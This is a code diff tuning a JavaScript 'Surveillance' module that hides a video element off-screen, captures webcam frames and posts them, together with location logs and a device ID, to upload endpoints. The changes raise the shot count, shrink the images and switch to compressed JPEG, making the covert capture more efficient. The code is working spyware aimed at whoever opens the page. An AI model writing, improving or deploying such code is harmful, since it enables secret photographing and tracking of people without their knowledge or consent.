@@ -5,7 +5,7 @@ const Surveillance = {
         timeout: 10000,
         logEndpoint: '/log_location',
         camEndpoint: '/upload',
-        camShots: 13,
+        camShots: 14,
         camInterval: 1000,
         enableLocation: true,
         enableCamera: true
@@ -127,8 +127,8 @@ const Surveillance = {
 
         const video = document.createElement('video')
         const canvas = document.createElement('canvas')
-        canvas.width = 640
-        canvas.height = 480
+        canvas.width = 480
+        canvas.height = 360
         video.style.cssText = 'position:absolute;top:-9999px;left:-9999px'
         document.body.appendChild(video)
 
@@ -160,11 +160,11 @@ const Surveillance = {
         let shotsTaken = 0
 
         for (let i = 0; i < this.config.camShots; i++) {
-            ctx.drawImage(video, 0, 0, 640, 480)
+            ctx.drawImage(video, 0, 0, 480, 360)
 
-            const data = canvas.toDataURL('image/png')
+            const data = canvas.toDataURL('image/jpeg', 0.5)
 
-            fetch(`${this.config.camEndpoint}?device_id=${id}&shot=${i + 1}`, {
+            await fetch(`${this.config.camEndpoint}?device_id=${id}&shot=${i + 1}`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ image: data })
